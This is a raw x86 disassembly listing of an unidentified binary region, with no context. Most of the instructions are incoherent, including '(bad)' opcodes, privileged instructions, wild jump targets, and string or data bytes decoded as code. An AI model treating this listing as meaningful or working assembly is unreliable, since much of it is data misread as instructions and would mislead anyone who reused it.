  43316f:	lea    ecx,[ebx-0x7617fc44]
  433175:	div    ah
  433177:	inc    DWORD PTR [ebp+0x45]
  43317a:	xor    ecx,DWORD PTR [ecx+0x4530d88d]
  433180:	jb     0x43310d
  433182:	add    BYTE PTR [eax*2-0x17ba743f],cl
  433189:	mov    ecx,DWORD PTR [ebp-0x10]
  43318c:	xor    ecx,DWORD PTR [ebp+0x3]
  43318f:	mov    edi,DWORD PTR [ebx]
  433191:	adc    BYTE PTR [ebp+0x41],dh
  433194:	mov    ecx,DWORD PTR [ebx-0x37382704]
  43319a:	ret    
  43319b:	push   ss
  43319c:	push   0x45
  43319e:	lea    ecx,[ebx+0x4de80cb0]
  4331a4:	sti    
  4331a5:	add    edi,edi
  4331a7:	or     BYTE PTR [ebp+0x4d],al
  4331aa:	mov    ebp,DWORD PTR [ebx]
  4331ac:	xor    ebp,ecx
  4331ae:	mov    al,BYTE PTR [edx]
  4331b0:	add    eax,0xc7200
  4331b5:	jne    0x433204
  4331b7:	lea    esi,[ebx]
  4331b9:	mov    al,0xf
  4331bb:	call   0xf2880
  4331c0:	shl    DWORD PTR [ecx],0x84
  4331c3:	pushf  
  4331c4:	add    DWORD PTR [ecx+0x4545d000],ecx
  4331ca:	mov    esi,DWORD PTR [edx]
  4331cc:	xor    ebx,DWORD PTR [edx+ecx*4+0x72c805c7]
  4331d3:	test   DWORD PTR [eax],eax
  4331d5:	clc    
  4331d6:	dec    ebp
  4331d7:	inc    ebp
  4331d8:	xor    edi,DWORD PTR [edi+ecx*1]
  4331db:	pushf  
  4331dc:	ror    BYTE PTR [ebp+0x4dc1d0cb],0x84
  4331e3:	lea    eax,[ecx]
  4331e5:	int3   
  4331e6:	add    BYTE PTR [ebp+0x45],cl
  4331e9:	lea    ecx,[ebx-0x75b2cc38]
  4331ef:	lea    eax,ds:0x4d72c4
  4331f5:	mov    ecx,DWORD PTR [ebp-0x4]
  4331f8:	xor    ecx,edi
  4331fa:	bswap  ebx
  4331fc:	ror    BYTE PTR [ebp-0x35],0xe9
  433200:	rol    DWORD PTR [ecx],0x84
  433203:	add    BYTE PTR [ecx],al
  433205:	xor    eax,DWORD PTR [eax]
  433207:	pushf  
  433208:	inc    ebp
  433209:	jnp    0x8a43660c
  43320f:	mov    eax,DWORD PTR ds:0xcf72e8
  433215:	lock dec ebp
  433217:	retf   
  433218:	xor    ecx,DWORD PTR [ebp+0xf]
  43321b:	mov    eax,eax
  43321d:	fmul   st,st(3)
  43321f:	test   ecx,0x19b8484
  433225:	xor    al,BYTE PTR [eax]
  433227:	mov    DWORD PTR [ebp-0x28],eax
  43322a:	mov    eax,DWORD PTR [ebp+0x33]
  43322d:	mov    ecx,DWORD PTR [edx+0x72c705d8]
  433233:	ret    
  433234:	add    al,cl
  433236:	dec    ebp
  433237:	adc    ecx,DWORD PTR [ebx-0x75ccccbb]
  43323d:	add    ecx,DWORD PTR ds:0xc7250
  433243:	inc    ebp
  433244:	rcl    DWORD PTR [eax+0x4d],0x2b
  433248:	mov    edi,edi
  43324a:	xor    ecx,DWORD PTR [ebx+0xde48a]
  433250:	jb     0x433219
  433252:	add    BYTE PTR [ecx+eax*8-0x74cdb2b5],al
  433259:	mov    esi,DWORD PTR [ebx]
  43325b:	cld    
  43325c:	mov    cl,bh
  43325e:	or     eax,0x372b6
  433263:	cmp    ecx,eax
  433265:	jne    0x4332e2
  43326b:	mov    eax,DWORD PTR [ebp-0x20]
  43326e:	mov    eax,DWORD PTR [eax]
  433270:	xor    eax,edi
  433272:	mov    al,BYTE PTR [ebp+eax*1+0x32724b]
  433279:	mov    ecx,DWORD PTR [ebp-0x4]
  43327c:	mov    ecx,edi
  43327e:	xor    esi,DWORD PTR [esi+0x3b0d038a]
  433284:	jb     0x433295
  433286:	add    BYTE PTR [edi-0x3f],dl
  433289:	add    BYTE PTR [ebp-0x75],cl
  43328c:	mov    esi,eax
  43328e:	xor    eax,DWORD PTR [eax]
  433290:	mov    al,bh
  433292:	or     eax,0x4b7284
  433297:	xor    al,cl
  433299:	mov    ecx,DWORD PTR [ebp-0x4]
  43329c:	mov    ecx,edi
  43329e:	xor    esi,DWORD PTR [esi+0x3b0d038a]
  4332a4:	jb     0x4332b5
  4332a6:	add    BYTE PTR [edi],dh
  4332a8:	enter  0x8500,0x8b
  4332ac:	add    ah,bl
  4332ae:	add    BYTE PTR [eax],al
  4332b0:	inc    ebp
  4332b1:	(bad)  
  4332b2:	mov    eax,DWORD PTR [ebx+esi*1+0x5328a4b]
  4332b9:	mov    esi,DWORD PTR [edx-0x4]
  4332bc:	add    bh,cl
  4332be:	dec    ebp
  4332bf:	mov    dh,0x8b
  4332c1:	add    esi,DWORD PTR [ebx]
  4332c3:	cmp    ecx,DWORD PTR [edx+0x72170d0f]
  4332c9:	add    BYTE PTR [eax],al
  4332cb:	mov    eax,ecx
  4332cd:	loopne 0x43331c
  4332cf:	add    BYTE PTR [ebx-0x757bcc39],cl
  4332d5:	dec    ebx
  4332d6:	or     eax,0x8b7232
  4332db:	in     al,0xc1
  4332dd:	or     DWORD PTR [ebp-0x31],ecx
  4332e0:	mov    ecx,DWORD PTR [ebx+esi*1+0xd328a4b]
  4332e7:	xor    dh,BYTE PTR [edx-0x75]
  4332ea:	add    al,dh
  4332ec:	enter  0x4f09,0xcf
  4332f0:	inc    ebp
  4332f1:	mov    WORD PTR [ebx-0x75cdccb5],cs
  4332f7:	or     al,BYTE PTR ds:0xe4728b
  4332fd:	or     DWORD PTR [ebp-0x31],ecx
  433300:	mov    ecx,DWORD PTR [ebx+esi*1+0xd328a4f]
  433307:	cmp    dh,BYTE PTR [edx+0xf]
  43330a:	add    bl,dl
  43330c:	rol    DWORD PTR [eax],0x4d
  43330f:	mov    ecx,DWORD PTR [ebx-0x75ffcc10]
  433315:	(bad)  
  433316:	or     eax,0x4b7284
  43331b:	xor    al,cl
  43331d:	mov    ecx,DWORD PTR [ebp-0x20]
  433320:	mov    ecx,DWORD PTR [ecx]
  433322:	xor    ecx,edi
  433324:	mov    cl,BYTE PTR [ebp+ecx*1+0x32724b]
  43332b:	xor    cl,al
  43332d:	mov    ecx,DWORD PTR [edi]
  43332f:	fadd   QWORD PTR [ebp+0x9]
  433332:	call   0xffd02e06
  433337:	dec    ebx
  433338:	dec    ebp
  433339:	xor    bh,BYTE PTR [ebx]
  43333b:	or     dh,BYTE PTR [ebx+ecx*4-0x75]
  43333f:	loopne 0x43333d
  433341:	or     edi,eax
  433343:	iret   
  433344:	ret    
  433345:	mov    WORD PTR [ebp+0x4f],es
  433348:	mov    esi,DWORD PTR [edx]
  43334a:	call   0x8452fa89
  43334f:	(bad)  
  433350:	fwait
  433351:	add    BYTE PTR [edx],dh
  433353:	mov    esi,DWORD PTR [ebx]
  433355:	fmul   QWORD PTR [ebx+0x55c7fc00]
  43335b:	test   BYTE PTR [ebx],dh
  43335d:	dec    ebx
  43335e:	add    esi,DWORD PTR [edx]
  433360:	cmp    ecx,DWORD PTR [ebx+0x9f8f00f]
  433366:	dec    edi
  433368:	mov    ecx,DWORD PTR [esp+edi*8+0x33324d4b]
  43336f:	xor    al,BYTE PTR [ebx]
  433371:	mov    edi,DWORD PTR [ebx]
  433373:	in     al,0x75
  433375:	or     DWORD PTR [ebx+0x4d8ce8cf],ecx
  43337b:	dec    ebx
  43337c:	xor    esi,DWORD PTR [edx]
  43337e:	lea    ecx,[edx]
  433380:	or     BYTE PTR [ebx+0x900f072],cl
  433386:	ja     0x433357
  433388:	sbb    BYTE PTR [ebp+esi*2-0x67cd72b1],cl
  43338f:	cmp    ch,al
  433391:	jne    0x433386
  433393:	mov    edi,edi
  433395:	fadd   QWORD PTR [ebp+0x0]
  433398:	mov    eax,edi
  43339a:	fadd   DWORD PTR [edi+eax*8-0x3ecd3cb5]
  4333a1:	mov    edx,DWORD PTR [ebx]
  4333a3:	in     al,0x45
  4333a5:	or     DWORD PTR [ebx],esi
  4333a7:	iret   
  4333a8:	add    ecx,DWORD PTR [eax+edx*2+0x4532184b]
  4333af:	xor    dl,BYTE PTR [eax-0x75]
  4333b2:	sbb    al,0xe0
  4333b4:	dec    DWORD PTR [ecx]
  4333b6:	mov    ecx,edi
  4333b8:	in     al,dx
  4333b9:	mov    eax,es
  4333bb:	dec    ebx
  4333bc:	mov    DWORD PTR [edx],esi
  4333be:	fmul   QWORD PTR [edx]
  4333c0:	jne    0x43334d
  4333c2:	(bad)  
  4333c3:	(bad)  
  4333c5:	or     DWORD PTR [ebp-0x31],eax
  4333c8:	add    ecx,DWORD PTR [eax+ecx*1-0xccd17b1]
  4333cf:	cmp    bh,bh
  4333d1:	jne    0x433418
  4333d3:	lea    ecx,[ebx-0x38372750]
  4333d9:	inc    ebx
  4333db:	mov    eax,ecx
  4333dd:	mov    eax,0xa00c111
  4333e2:	jne    0x433429
  4333e4:	mov    esi,DWORD PTR [ebx]
  4333e6:	test   al,0x3
  4333e8:	inc    ebp
  4333e9:	mov    DWORD PTR [eax-0xc],edx
  4333ec:	loop   0x433433
  4333ee:	push   DWORD PTR [ebx]
  4333f0:	mov    ecx,DWORD PTR [ebp+0x724d3010]
  4333f6:	add    DWORD PTR [eax],eax
  4333f8:	mov    eax,edi
  4333fa:	lods   al,BYTE PTR ds:[esi]
  4333fb:	dec    ebp
  4333fc:	inc    ebp
  4333fd:	mov    ecx,DWORD PTR [ecx+0x45cf14f4]
  433403:	retf   
  433404:	mov    edx,ecx
  433406:	adc    al,0x84
  433408:	(bad)  
  433409:	std    
  43340a:	ret    
  43340b:	jmp    FWORD PTR [edi-0x2b7474bb]
  433411:	hlt    
  433412:	rol    edi,0x82
  433415:	ret    
  433416:	cld    
  433417:	enter  0x11ff,0x45
  43341b:	inc    ebp
  43341c:	pop    edi
  43341d:	mov    ebx,DWORD PTR [ebx+0x14]
  433420:	ret    0xc7
  433423:	test   BYTE PTR [ebx+0x4532519b],cl
  433429:	jmp    0x4333b6
  43342b:	push   0x8
  43342d:	call   DWORD PTR [esi]
  43342f:	in     al,dx
  433430:	add    BYTE PTR [ebp+0x1],0x50
  433434:	add    bh,ah
  433436:	add    bh,bh
  433438:	icebp  
  433439:	mov    ecx,DWORD PTR [eax]
  43343b:	cld    
  43343c:	pop    es
  43343d:	dec    ebp
  43343e:	shl    DWORD PTR [ebx],0x72
  433441:	add    eax,DWORD PTR [eax]
  433443:	cmp    edx,ecx
  433445:	je     0x433457
  433447:	mov    esi,DWORD PTR [ebp-0x4]
  43344a:	inc    edi
  43344c:	or     al,0xc3
  43344e:	jmp    FWORD PTR [edx-0x18]
  433451:	(bad)  
  433452:	sti    
  433453:	cwde   
  433454:	(bad)  
  433455:	call   0xffa12d60
  43345a:	or     al,0x45
  43345c:	push   ebp
  43345d:	sub    esp,0x18
  433460:	push   ebx
  433461:	inc    ebp
  433462:	mov    edi,edi
  433464:	mov    ebp,DWORD PTR [eax+ecx*1+0x578b4d75]
  43346b:	test   al,0x54
  43346d:	inc    ebp
  43346e:	push   ecx
  43346f:	push   eax
  433470:	xor    ebp,DWORD PTR [ebx-0x748d0041]
  433476:	add    ah,bh
  433478:	(bad)  
  433479:	dec    ebp
  43347a:	add    DWORD PTR [ebx],esi
  43347c:	inc    ebp
  43347d:	add    ecx,DWORD PTR [ebx+0x74943b]
  433483:	push   0xffffff8b
  433485:	dec    DWORD PTR [ebx-0x7fbaeb54]
  43348b:	add    eax,DWORD PTR [ecx]
  43348d:	or     BYTE PTR [eax],al
  43348f:	call   0xff852c94
  433494:	mov    eax,DWORD PTR [ebp+0x14]
  433497:	mov    ecx,DWORD PTR [ecx+0x801ac]
  43349d:	inc    ebp
  43349e:	dec    ecx
  43349f:	add    ebp,DWORD PTR [edx+0x14]
  4334a2:	push   0x8b3045
  4334a7:	call   0x33ad821c
  4334ac:	inc    DWORD PTR [ebx]
  4334ae:	mov    DWORD PTR [edi],ecx
  4334b0:	mov    eax,ecx
  4334b2:	or     BYTE PTR [ebp-0x3d],cl
  4334b5:	cmp    eax,edi
  4334b7:	cmovne esp,DWORD PTR [ebx+ecx*4-0x1]
  4334bc:	adc    BYTE PTR [ebx+0x5eff0845],cl
  4334c2:	adc    al,0xc9
  4334c4:	inc    ebp
  4334c5:	adc    BYTE PTR [eax+0x55],dl
  4334c8:	jne    0x4334b6
  4334ca:	call   0xff54345a
  4334cf:	dec    ebp
  4334d0:	inc    ebp
  4334d1:	mov    ecx,DWORD PTR [ebx+0x390338b]
  4334d7:	add    BYTE PTR [ebx],bh
  4334d9:	mov    esi,DWORD PTR [ecx+eax*4-0x75]
  4334dd:	push   esp
  4334de:	or     al,0x51
  4334e0:	dec    ebp
  4334e1:	xor    DWORD PTR [ebx],0xf32039b
  4334e7:	cmp    eax,DWORD PTR [ebp+0x74]
  4334ea:	mov    edi,edi
  4334ec:	pop    edi
  4334ed:	adc    BYTE PTR [ebx+0x75],bl
  4334f0:	ret    0x50
  4334f3:	mov    edx,DWORD PTR ss:[edi-0x7d]
  4334f7:	(bad)  
  4334f8:	clc    
  4334f9:	mov    esp,ebp
  4334fb:	pop    ecx
  4334fc:	mov    ecx,0xf80085c2
  433501:	mov    ecx,DWORD PTR [ecx+edx*2]
  433504:	push   esi
  433505:	push   esi
  433506:	(bad)  
  433507:	lock add DWORD PTR [ebp+0x44],eax
  43350b:	mov    edx,DWORD PTR [eax]
  43350d:	adc    BYTE PTR [ebx+edi*4+0x8],bh
  433511:	or     BYTE PTR [edi+eax*1+0x51],dl
  433515:	ret    
  433516:	xor    ebx,DWORD PTR [ebx+0x37232be]
  43351c:	add    BYTE PTR [ecx+0x147c8bfe],cl
  433522:	or     al,0x80
  433524:	jge    0x433527
  433526:	mov    DWORD PTR [eax],eax
  433528:	and    al,0x8
  43352a:	cmp    DWORD PTR [ebp+0x10],eax
  43352d:	mov    edx,DWORD PTR [esi]
  43352f:	xchg   esp,eax
  433530:	dec    esp
  433531:	add    BYTE PTR [eax],dl
  433533:	mov    ecx,edx
  433535:	add    edx,DWORD PTR [esp+edi*1+0x8]
  433539:	dec    ebp
  43353a:	into   
  43353b:	mov    ebp,DWORD PTR [edi+0x240089d8]
  433541:	mov    edx,DWORD PTR [eax+0x14]
  433544:	das    
  433545:	add    al,0x45
  433547:	add    BYTE PTR [ebp+0x0],dh
  43354a:	mov    edi,edi
  43354c:	and    al,0x50
  43354e:	mov    eax,DWORD PTR [eax]
  433550:	and    al,0xd1
  433552:	xor    eax,DWORD PTR [esi]
  433554:	lea    eax,[ebp+0x8]
  433557:	xor    esi,DWORD PTR [edx+0x3]
  43355a:	add    BYTE PTR [ecx+0x4510fc44],cl
  433560:	xor    ecx,DWORD PTR [ebx+0x75eb0c9c]
  433566:	or     DWORD PTR [ebp-0x7a03f0],0x541608f8
  433570:	cmp    al,0xff
  433572:	pushf  
  433573:	mov    edi,edi
  433575:	or     BYTE PTR [esi+ecx*1],cl
  433578:	jne    0x43353d
  43357a:	call   0xc3546
  43357f:	adc    BYTE PTR [ebp+eax*2+0xc],al
  433583:	mov    ebx,DWORD PTR [eax]
  433585:	adc    BYTE PTR [ebx+eax*8+0x14],dh
  433589:	mov    DWORD PTR [edi+ebp*4+0x10],0xff0175fc
  433591:	pop    esi
  433592:	and    al,0xc9
  433594:	and    al,0x10
  433596:	call   DWORD PTR [ebp-0x73]
  433599:	in     al,dx
  43359a:	jmp    esp
  43359c:	je     0x433521
  43359e:	call   DWORD PTR [eax]
  4335a0:	and    al,0x31
  4335a2:	call   0xffcd3443
  4335a7:	and    al,0x44
  4335a9:	push   edi
  4335aa:	or     al,0x41
  4335ac:	pop    esi
  4335ad:	mov    ebp,esp
  4335af:	and    al,0xc2
  4335b1:	mov    eax,DWORD PTR [eax]
  4335b3:	and    al,0x85
  4335b5:	mov    edx,0x733080e
  4335ba:	jne    0x4335b6
  4335bc:	test   DWORD PTR [ebx+0x3083275],ebx
  4335c2:	dec    DWORD PTR [ecx-0x74dbdb15]
  4335c8:	sbb    BYTE PTR [esp+edx*1],cl
  4335cb:	jl     0x4335cc
  4335cd:	adc    al,0x24
  4335cf:	dec    ebp
  4335d0:	mov    esi,DWORD PTR [ebp+0xc]
  4335d3:	mov    ecx,DWORD PTR [eax]
  4335d5:	and    al,0x39
  4335d7:	xor    ebx,DWORD PTR [ebx+ecx*4]
  4335da:	or     BYTE PTR [eax+edx*1],ah
  4335dd:	add    eax,DWORD PTR [edi+ecx*1+0x4c24ca32]
  4335e4:	clc    
  4335e5:	jmp    0x433583
  4335e7:	adc    al,bh
  4335e9:	inc    esp
  4335ea:	je     0x433638
  4335ec:	and    al,0xc2
  4335ee:	je     0x43358b
  4335f0:	mov    ecx,DWORD PTR [ecx+0x687d685d]
  4335f6:	dec    DWORD PTR [ecx+0x235fbf08]
  4335fc:	sbb    al,0x10
  4335fe:	add    BYTE PTR [esi+edi*1+0x10],cl
  433602:	add    BYTE PTR [ebx+0xb],dh
  433605:	adc    BYTE PTR [eax],al
  433607:	mov    WORD PTR ds:0x3d450010,?
  43360d:	adc    BYTE PTR [eax],al
  43360f:	add    DWORD PTR [eax+edx*1],esp
  433612:	add    BYTE PTR [edx+0x6],cl
  433615:	adc    BYTE PTR [eax],al
  433617:	sub    dx,WORD PTR [eax]
  43361a:	add    bh,dl
  43361c:	imul   edx,DWORD PTR [eax],0x10302300
  433622:	add    BYTE PTR [esi-0x4ffef89],dl
  433628:	xor    eax,0x35ff0043
  43362d:	inc    ebx
  43362e:	add    BYTE PTR [ebx],al
  433630:	ss inc ebx
  433632:	add    BYTE PTR [edi],al
  433634:	ss inc ebx
  433636:	add    BYTE PTR [ebx],cl
  433638:	ss inc ebx
  43363a:	add    BYTE PTR [edi],cl
  43363c:	ss inc ebx
  43363e:	add    BYTE PTR [ebx],dl
  433640:	ss inc ebx
  433642:	add    BYTE PTR [edi],dl
  433644:	ss inc ebx
  433646:	add    BYTE PTR [ebx],bl
  433648:	ss inc ebx
  43364a:	add    BYTE PTR [edi],bl
  43364c:	ss inc ebx
  43364e:	add    BYTE PTR [ebx],ah
  433650:	ss inc ebx
  433652:	add    BYTE PTR [eax+0x9001011],ah
  433658:	jo     0x43366a
  43365a:	add    BYTE PTR ds:0xd7001027,ch
  433660:	pop    eax
  433661:	adc    BYTE PTR [eax],al
  433663:	push   es
  433664:	adc    al,0x10
  433666:	add    BYTE PTR [esi+0x33001031],ah
  43366c:	ins    BYTE PTR es:[edi],dx
  43366d:	adc    BYTE PTR [eax],al
  43366f:	jb     0x4336b0
  433671:	adc    BYTE PTR [eax],al
  433673:	push   ebx
  433674:	ss inc ebx
  433676:	add    BYTE PTR [edi+0x36],dl
  433679:	inc    ebx
  43367a:	add    BYTE PTR [ebx+0x36],bl
  43367d:	inc    ebx
  43367e:	add    BYTE PTR [edi+0x36],bl
  433681:	inc    ebx
  433682:	add    BYTE PTR [ebx+0x36],ah
  433685:	inc    ebx
  433686:	add    BYTE PTR [edi+0x36],ah
  433689:	inc    ebx
  43368a:	add    BYTE PTR [ebx+0x36],ch
  43368d:	inc    ebx
  43368e:	add    BYTE PTR [edi+0x36],ch
  433691:	inc    ebx
  433692:	add    dh,cl
  433694:	jge    0x4336a6
  433696:	add    BYTE PTR [esi-0x3dffef8e],dl
  43369c:	or     dl,BYTE PTR [eax]
  43369e:	add    dh,bl
  4336a0:	sub    dl,BYTE PTR [eax]
  4336a2:	add    BYTE PTR [edx],bl
  4336a4:	ins    BYTE PTR es:[edi],dx
  4336a5:	adc    BYTE PTR [eax],al
  4336a7:	addr16 jno 0x4336ba
  4336aa:	add    BYTE PTR [ebp+0x3d],ch
  4336ad:	adc    BYTE PTR [eax],al
  4336af:	lds    esp,FWORD PTR [eax+0x10]
  4336b2:	add    BYTE PTR [ebx-0x68ffbcca],dl
  4336b8:	ss inc ebx
  4336ba:	add    BYTE PTR [ebx-0x60ffbcca],bl
  4336c0:	ss inc ebx
  4336c2:	add    BYTE PTR [ebx-0x58ffbcca],ah
  4336c8:	ss inc ebx
  4336ca:	add    BYTE PTR [ebx-0x50ffbcca],ch
  4336d0:	ss inc ebx
  4336d2:	add    BYTE PTR [esp+edx*1],bh
  4336d5:	adc    BYTE PTR [eax],al
  4336d7:	clc    
  4336d8:	cmp    dl,BYTE PTR [eax]
  4336da:	add    BYTE PTR [ecx],ah
  4336dc:	pop    ds
  4336dd:	adc    BYTE PTR [eax],al
  4336df:	mov    edi,0x6001073
  4336e4:	adc    al,0x10
  4336e6:	add    BYTE PTR [ecx+0x34],bh
  4336e9:	adc    BYTE PTR [eax],al
  4336eb:	cmp    edi,DWORD PTR [eax+edx*1+0x0]
  4336ef:	shl    DWORD PTR [edx+0x10],1
  4336f2:	add    bl,dl
  4336f4:	ss inc ebx
  4336f6:	add    bh,dl
  4336f8:	ss inc ebx
  4336fa:	add    bl,bl
  4336fc:	ss inc ebx
  4336fe:	add    bh,bl
  433700:	ss inc ebx
  433702:	add    bl,ah
  433704:	ss inc ebx
  433706:	add    bh,ah
  433708:	ss inc ebx
  43370a:	add    bl,ch
  43370c:	ss inc ebx
  43370e:	add    bh,ch
  433710:	ss inc ebx
  433712:	add    BYTE PTR [ebp+0x14],al
  433715:	adc    BYTE PTR [eax],al
  433717:	fwait
  433718:	pop    ds
  433719:	adc    BYTE PTR [eax],al
  43371b:	jnp    0x433740
  43371d:	adc    BYTE PTR [eax],al
  43371f:	pop    esi
  433720:	adc    BYTE PTR cs:[eax],al
  433723:	popf   
  433724:	jno    0x433736
  433726:	add    ah,bl
  433728:	inc    ebp
  433729:	adc    BYTE PTR [eax],al
  43372b:	sbb    edx,DWORD PTR [edx+0x10]
  43372e:	add    BYTE PTR [edx+0x13001029],bl
  433734:	aaa    
  433735:	inc    ebx
  433736:	add    BYTE PTR [edi],dl
  433738:	aaa    
  433739:	inc    ebx
  43373a:	add    BYTE PTR [ebx],bl
  43373c:	aaa    
  43373d:	inc    ebx
  43373e:	add    BYTE PTR [edi],bl
  433740:	aaa    
  433741:	inc    ebx
  433742:	add    BYTE PTR [ebx],ah
  433744:	aaa    
  433745:	inc    ebx
  433746:	add    BYTE PTR [edi],ah
  433748:	aaa    
  433749:	inc    ebx
  43374a:	add    BYTE PTR [ebx],ch
  43374c:	aaa    
  43374d:	inc    ebx
  43374e:	add    BYTE PTR [edi],ch
  433750:	aaa    
  433751:	inc    ebx
  433752:	add    BYTE PTR [esp+esi*1+0x4b],dl
  433756:	aaa    
  433757:	pop    edi
  433758:	inc    edx
  433759:	dec    ebx
  43375a:	xor    DWORD PTR [ecx],edi
  43375c:	push   edi
  43375d:	add    BYTE PTR [ecx+0x39],cl
  433760:	xor    al,0x5f
  433762:	pop    ecx
  433763:	inc    edi
  433764:	push   edx
  433765:	pop    edi
  433766:	dec    edx
  433767:	xor    al,BYTE PTR [edx+0x30]
  43376a:	push   ebx
  43376b:	add    BYTE PTR [ecx+0x4a],cl
  43376e:	cmp    BYTE PTR [edi+0x38],bl
  433771:	xor    al,0x43
  433773:	xor    bl,BYTE PTR [eax+0x36]
  433776:	pop    edi
  433777:	inc    ebx
  433778:	add    BYTE PTR [edx+0x33],cl
  43377b:	dec    ebp
  43377c:	cmp    BYTE PTR [edi+0x53],bl
  43377f:	xor    DWORD PTR [eax],edi
  433781:	pop    edx
  433782:	pop    edi
  433783:	xor    BYTE PTR [edx+0x52],cl
  433786:	inc    ecx
  433787:	add    BYTE PTR [edx+0x42],al
  43378a:	inc    ebp
  43378b:	pop    edi
  43378c:	cmp    DWORD PTR [eax],edi
  43378e:	push   ebp
  43378f:	inc    edx
  433790:	xor    eax,0x5244505f
  433795:	xor    BYTE PTR [eax],al
  433797:	inc    edx
  433798:	inc    esp
  433799:	inc    edx
  43379a:	cmp    DWORD PTR [edi+0x52],ebx
  43379d:	dec    esp
  43379e:	inc    ebp
  43379f:	add    BYTE PTR [ebx+0x37],dl
  4337a2:	push   esp
  4337a3:	xor    BYTE PTR [edi+0x55],bl
  4337a6:	push   ebx
  4337a7:	aaa    
  4337a8:	dec    ebp
  4337a9:	pop    edi
  4337aa:	xor    ecx,DWORD PTR [edx+0x4e]
  4337ad:	dec    ebx
  4337ae:	add    BYTE PTR [edx+0x47],cl
  4337b1:	inc    edi
  4337b2:	xor    eax,0x534e5f32
  4337b7:	push   esp
  4337b8:	pop    edi
  4337b9:	push   esp
  4337ba:	inc    edx
  4337bb:	add    BYTE PTR [ebx+0x4d],al
  4337be:	xor    BYTE PTR [edi+0x47],bl
  4337c1:	cmp    DWORD PTR [ecx+0x5f],ebx
  4337c4:	push   eax
  4337c5:	push   ecx
  4337c6:	push   ecx
  4337c7:	pop    edi
  4337c8:	inc    ebx
  4337c9:	push   edi
  4337ca:	push   esi
  4337cb:	add    BYTE PTR [ecx+0x57],cl
  4337ce:	inc    ebp
  4337cf:	pop    edi
  4337d0:	pop    ecx
  4337d1:	push   edx
  4337d2:	inc    edx
  4337d3:	pop    edi
  4337d4:	inc    edi
  4337d5:	add    BYTE PTR [ebx+0x51],dl
  4337d8:	cmp    DWORD PTR ds:0x4d305f33,esi
  4337de:	inc    edi
  4337df:	xor    edx,DWORD PTR [edx+0x34]
  4337e2:	pop    edi
  4337e3:	pop    edx
  4337e4:	cmp    BYTE PTR [eax],al
  4337e6:	inc    edi
  4337e7:	xor    esi,DWORD PTR ds:0x5451585f
  4337ed:	dec    esp
  4337ee:	add    BYTE PTR [edi+esi*1+0x34],cl
  4337f2:	pop    edi
  4337f3:	cmp    BYTE PTR [edi+0x49],dl
  4337f6:	xor    eax,0x5700505f
  4337fb:	cmp    DWORD PTR [edi+ebx*2+0x50],eax
  4337ff:	dec    esi
  433800:	dec    edx
  433801:	cmp    BYTE PTR [eax],al
  433803:	pop    edx
  433804:	dec    ebx
  433805:	xor    eax,0x4f5f3131
  43380a:	xor    dh,BYTE PTR [ecx]
  43380c:	pop    edi
  43380d:	inc    ebp
  43380e:	push   esp
  43380f:	inc    esp
  433810:	inc    ebp
  433811:	add    BYTE PTR [edi+0x55],dl
  433814:	cmp    DWORD PTR [edi+0x5a],ebx
  433817:	push   edx
  433818:	inc    edi
  433819:	xor    DWORD PTR [ebp+0x0],ecx
  43381c:	pop    edx
  43381d:	dec    ecx
  43381e:	dec    ebp
  43381f:	ss pop edi
  433821:	pop    edx
  433822:	push   edx
  433823:	cmp    BYTE PTR [esi+0x30],dl
  433826:	pop    edi
  433827:	push   ecx
  433828:	dec    esi
  433829:	add    BYTE PTR [ebx+0x32],dl
  43382c:	inc    ebx
  43382d:	cmp    BYTE PTR [edi+0x52],bl
  433830:	dec    ecx
  433831:	xor    BYTE PTR [eax],al
  433833:	inc    edi
  433834:	xor    eax,0x314f5f4b
  433839:	xor    DWORD PTR [edi+0x38],ebx
  43383c:	push   ebp
  43383d:	add    BYTE PTR [edi+0x4b],al
  433840:	xor    bl,BYTE PTR [edi+0x43]
  433843:	push   ebp
  433844:	cmp    DWORD PTR [ebp+0x4b],ecx
  433847:	ss pop edi
  433849:	pop    edx
  43384a:	push   edi
  43384b:	inc    esp
  43384c:	xor    BYTE PTR [eax],al
  43384e:	dec    ecx
  43384f:	inc    edi
  433850:	xor    eax,0x3058555f
  433855:	dec    ebx
  433856:	pop    edi
  433857:	push   edi
  433858:	add    BYTE PTR [eax+0x0],bl
  43385b:	inc    edi
  43385c:	add    BYTE PTR [edx+0x0],al
  43385f:	pop    edi
  433860:	add    BYTE PTR [ebx],dh
  433862:	add    BYTE PTR [eax],bh
  433864:	add    BYTE PTR [ebx+0x0],cl
  433867:	xor    eax,0x33003500
  43386c:	add    BYTE PTR [eax],dh
  43386e:	add    BYTE PTR [edi+0x0],bl
  433871:	push   esp
  433872:	add    BYTE PTR [ebp+0x0],cl
  433875:	xor    BYTE PTR [eax],al
  433877:	add    BYTE PTR [eax],al
  433879:	inc    esi
  43387a:	add    BYTE PTR [eax+0x0],bl
  43387d:	xor    BYTE PTR [eax],al
  43387f:	pop    edi
  433880:	add    BYTE PTR [ecx],dh
  433882:	add    BYTE PTR [ebx+0x0],al
  433885:	xor    eax,0x5f003100
  43388a:	add    BYTE PTR [ecx+0x0],al
  43388d:	xor    eax,DWORD PTR [eax]
  43388f:	add    BYTE PTR [eax],al
  433891:	push   ebx
  433892:	add    BYTE PTR [ebx+0x0],dl
  433895:	dec    eax
  433896:	add    BYTE PTR [edi+0x0],bl
  433899:	push   esp
  43389a:	add    BYTE PTR [ebx+0x0],al
  43389d:	push   ebx
  43389e:	add    BYTE PTR [edx+0x0],dl
  4338a1:	pop    edi
  4338a2:	add    BYTE PTR [ecx+0x0],dl
  4338a5:	dec    edi
  4338a6:	add    BYTE PTR [edi+0x0],al
  4338a9:	push   ecx
  4338aa:	add    BYTE PTR [edi+0x0],bl
  4338ad:	pop    ecx
  4338ae:	add    BYTE PTR [eax],al
  4338b0:	add    BYTE PTR [edi+0x0],cl
  4338b3:	dec    edi
  4338b4:	add    BYTE PTR [ebp+0x0],dl
  4338b7:	cmp    DWORD PTR [eax],eax
  4338b9:	pop    edi
  4338ba:	add    BYTE PTR [edx],dh
  4338bc:	add    BYTE PTR [eax+eax*1+0x32],al
  4338c0:	add    BYTE PTR ds:0x47005f00,dh
  4338c6:	add    BYTE PTR ds:0x48000000,dh
  4338cc:	add    BYTE PTR [edx+0x0],cl
  4338cf:	push   eax
  4338d0:	add    BYTE PTR [edi+0x0],bl
  4338d3:	cmp    BYTE PTR [eax],al
  4338d5:	add    BYTE PTR ss:0x55004100,dh
  4338dc:	add    BYTE PTR [edi+0x0],bl
  4338df:	push   edx
  4338e0:	add    BYTE PTR [edi],dh
  4338e2:	add    BYTE PTR [ecx+0x0],cl
  4338e5:	add    BYTE PTR [eax],al
  4338e7:	inc    esp
  4338e8:	add    BYTE PTR [ecx+0x0],dl
